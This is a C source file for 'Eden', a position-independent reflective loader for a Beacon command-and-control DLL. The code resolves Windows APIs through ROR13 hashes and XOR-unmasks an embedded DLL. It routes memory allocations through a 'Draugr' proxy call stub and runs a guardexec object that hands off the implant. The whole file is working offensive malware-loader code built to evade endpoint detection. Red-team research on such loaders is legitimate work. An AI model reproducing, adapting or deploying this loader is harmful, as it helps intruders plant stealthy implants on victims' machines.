/*
* Eden
*/

/* Function prototypes */
void ReflectiveLoader();

/* This is the REAL entry point to this whole mess and it needs to go first! */
__attribute__((noinline, no_reorder)) void go() {
    ReflectiveLoader();
}

/* These are after to ensure entry point^ goes first. */
#include "tcglib/loaderdefs.h"
#include "tcglib/loader.h"
#include "tcglib/picorun.h"
#include "tcglib/resolve_eat.h"
#include "tcglib/picdebug.h"
#include "eden.h"

/*
 * Need other hashes?
 *
 * https://github.com/ihack4falafel/ROR13HashGenerator
 */
#define KERNEL32DLL_HASH           0x6A4ABC5B
#define LOADLIBRARYA_HASH          0xEC0E4E8E
#define GETPROCADDRESS_HASH        0x7C0DFCAA
#define GETMODULEHANDLEA_HASH      0xD3324904
#define VIRTUALALLOC_HASH          0x91AFCA54
#define VIRTUALPROTECT_HASH        0x7946C61B   /* not used but could be useful... */

void findNeededFunctions(WIN32FUNCS * funcs) {
    char * hModule = (char *)findModuleByHash(KERNEL32DLL_HASH);

    funcs->LoadLibraryA     = (__typeof__(LoadLibraryA) *)     findFunctionByHash(hModule, LOADLIBRARYA_HASH);
    funcs->GetProcAddress   = (__typeof__(GetProcAddress) *)   findFunctionByHash(hModule, GETPROCADDRESS_HASH);
    funcs->GetModuleHandleA = (__typeof__(GetModuleHandleA) *) findFunctionByHash(hModule, GETMODULEHANDLEA_HASH);
    funcs->VirtualAlloc     = (__typeof__(VirtualAlloc) *)     findFunctionByHash(hModule, VIRTUALALLOC_HASH);
    funcs->VirtualProtect   = (__typeof__(VirtualProtect) *)   findFunctionByHash(hModule, VIRTUALPROTECT_HASH);
}

/*
 * This is the Crystal Palace convention for getting ahold of data linked with this loader.
 */
char __DLLDATA__[0] __attribute__((section("beacon")));
char __BOFDATA__[0] __attribute__((section("guard_exec")));
char __PROXYDATA__[0] __attribute__((section("draugr")));
char __KEYDATA__[0] __attribute__((section("key")));

char * findAppendedDLL() {
    return (char *)&__DLLDATA__;
}

char * findAppendedPICO() {
    return (char *)&__BOFDATA__;
}

char * findAppendedProxy() {
    return (char *)&__PROXYDATA__;
}

char * findAppendedKey() {
    return (char *)&__KEYDATA__;
}

/*
 * Get the start address of our PIC DLL loader.
 */
char * getStart() {
    return (char *)go;
}

/*
 * Our PICO loader, have fun, go nuts!
 * @param funcs IMPORTFUNCS struct of resolved WinAPI funcs
 * @param dll Location of unmasked Beacon DLL
 * @param loader Location of our loader
 * @param picStub Location of our proxy stub (i.e. Draugr call gate)
 */
typedef void (*PICOMAIN_FUNC_2)(IMPORTFUNCS* funcs, char * dll, char * loader, char * picStub);

/*
*  Function for unmasking appended xor'd DLL.
*/
char * unmask(WIN32FUNCS * funcs, char * srcData) {
    _RESOURCE * key = { 0 };
    _RESOURCE * src = { 0 };
    char      * dst = NULL;
    FUNCTION_CALL functionCall = { 0 };
 
    /* Locate our $DLLKEY and our xor'd DLL. */
    key = (_RESOURCE *)findAppendedKey();
    src = (_RESOURCE *)srcData;

    /* Allocate memory for our unmasked content. */
    /*
    * NB I would prefer to avoid this and reuse memory but it appears no easy way
    * to natively push sizeOfImage into our PIC payload in CP (i.e. like preplen).
    */
    functionCall.functionPtr = funcs->VirtualAlloc;
    functionCall.numOfArgs = 4;
    functionCall.args[0] = (ULONG_PTR)NULL;
    functionCall.args[1] = src->length;
    functionCall.args[2] = MEM_RESERVE|MEM_COMMIT;
    functionCall.args[3] = PAGE_READWRITE;
    funcs->proxy((IMPORTFUNCS*)funcs, &functionCall);
    dst = (char *)functionCall.retValue;
 
    /* Unmask it. */
    for (int x = 0; x < src->length; x++) {
        dst[x] = src->value[x] ^ key->value[x % key->length];
    }
    dprintf((IMPORTFUNCS*)funcs, "EDEN LOADER: Unmasked DLL located at %p\n", dst);
 
    return dst;
}

/*
* Quick runner for setting up COFF memory.
*/
char * SetupCOFF(WIN32FUNCS * funcs, char * dstCode, char * srcData) {
    char * dstData = NULL;
    FUNCTION_CALL functionCall = { 0 };
 
    /* Allocate memory for our PICO's data. */
    functionCall.functionPtr = funcs->VirtualAlloc;
    functionCall.numOfArgs = 4;
    functionCall.args[0] = (ULONG_PTR)NULL;
    functionCall.args[1] = PicoDataSize(srcData);
    functionCall.args[2] = MEM_RESERVE|MEM_COMMIT|MEM_TOP_DOWN;
    functionCall.args[3] = PAGE_READWRITE;
    funcs->proxy((IMPORTFUNCS*)funcs, &functionCall);
    dstData = (char *)functionCall.retValue;
    dprintf((IMPORTFUNCS*)funcs, "EDEN LOADER: Guardexec data location: %p\n", dstData);
 
    /* Load our pico into our destination address, thanks! */
    /* NB If you *modify* the code and get a crash here, it is highly likely EDEN_LAYOUT is too small. */
    PicoLoad((IMPORTFUNCS *)funcs, srcData, dstCode, dstData);
    dprintf((IMPORTFUNCS*)funcs, "EDEN LOADER: Guardexec PICO loaded!\n");
    return dstCode;
}

/*
* A quick COFF runner for guardexec.
*/
void RunViaGuardExecCOFF(WIN32FUNCS * funcs, char * dstCode, char * dll, char * picStub ) {
    char * src = findAppendedPICO();

    /* Setup our PICO. */
    dprintf((IMPORTFUNCS*)funcs, "EDEN LOADER: Guardexec PICO code size: %d\n", PicoCodeSize(src));
    dprintf((IMPORTFUNCS*)funcs, "EDEN LOADER: Guardexec PICO data size: %d\n", PicoDataSize(src));
    char * dst = SetupCOFF(funcs, dstCode, src);

    /* Execute our PICO. */
    dprintf((IMPORTFUNCS*)funcs, "EDEN LOADER: Executing guardexec...\n");
    ((PICOMAIN_FUNC_2)PicoEntryPoint(src, dst)) ( (IMPORTFUNCS *)funcs, dll, getStart(), picStub );
}

/*
* Our main loader entry point.
* NB No debug build for the loader as it is non-trivial getting PIC blobs of XOR'd dll + key from CP.
*/
void ReflectiveLoader() {
    char * srcDll;
    EDEN_LAYOUT * dst;
    WIN32FUNCS funcs;
    FUNCTION_CALL functionCall;

    /* Resolve the functions we'll need. */
    findNeededFunctions(&funcs);

    /* Locate proxy PIC stub / entry point & set funcs.proxy to it. */
    _RESOURCE * picResource = (_RESOURCE*)findAppendedProxy();
    funcs.proxy = (PROXY)picResource->value;
    dprintf((IMPORTFUNCS*)&funcs, "EDEN LOADER: Embedded Draugr PIC stub location: %p\n", picResource->value);
    dprintf((IMPORTFUNCS*)&funcs, "EDEN LOADER: Embedded Draugr PIC stub size: %d\n", picResource->length);

    /* Find our Beacon DLL appended to this PIC and unmask it. */
    srcDll = findAppendedDLL();
    dprintf((IMPORTFUNCS*)&funcs, "EDEN LOADER: Location of embedded DLL to unmask: %p\n", srcDll);
    srcDll = unmask(&funcs, srcDll);

    /* Allocate memory for EDEN_LAYOUT struct. */
    /* NB This uses RWX - if desired you could set it to RW and change it to RX later...*/
    dprintf((IMPORTFUNCS*)&funcs, "EDEN LOADER: Allocating memory for EDEN_LAYOUT structure..\n");
    functionCall.functionPtr = funcs.VirtualAlloc;
    functionCall.numOfArgs = 4;
    functionCall.args[0] = (ULONG_PTR)NULL;
    functionCall.args[1] = sizeof(EDEN_LAYOUT);
    functionCall.args[2] = MEM_RESERVE|MEM_COMMIT|MEM_TOP_DOWN;
    functionCall.args[3] = PAGE_EXECUTE_READWRITE;
    funcs.proxy((IMPORTFUNCS*)&funcs, &functionCall);
    dst = (EDEN_LAYOUT *)functionCall.retValue;

    /* Copy over embedded PIC stub to EDEN_LAYOUT->proxy. */
    dprintf((IMPORTFUNCS*)&funcs, "EDEN LOADER: EDEN_LAYOUT->proxy location: %p\n", dst->proxy);
    dprintf((IMPORTFUNCS*)&funcs, "EDEN LOADER: EDEN_LAYOUT->guardexec location: %p\n", dst->guardexec);
    memcpy(dst->proxy, picResource->value, picResource->length);

    /* Load guardexec PICO into EDEN_LAYOUT->guardexec. */
    RunViaGuardExecCOFF(&funcs, dst->guardexec, srcDll, dst->proxy);
}
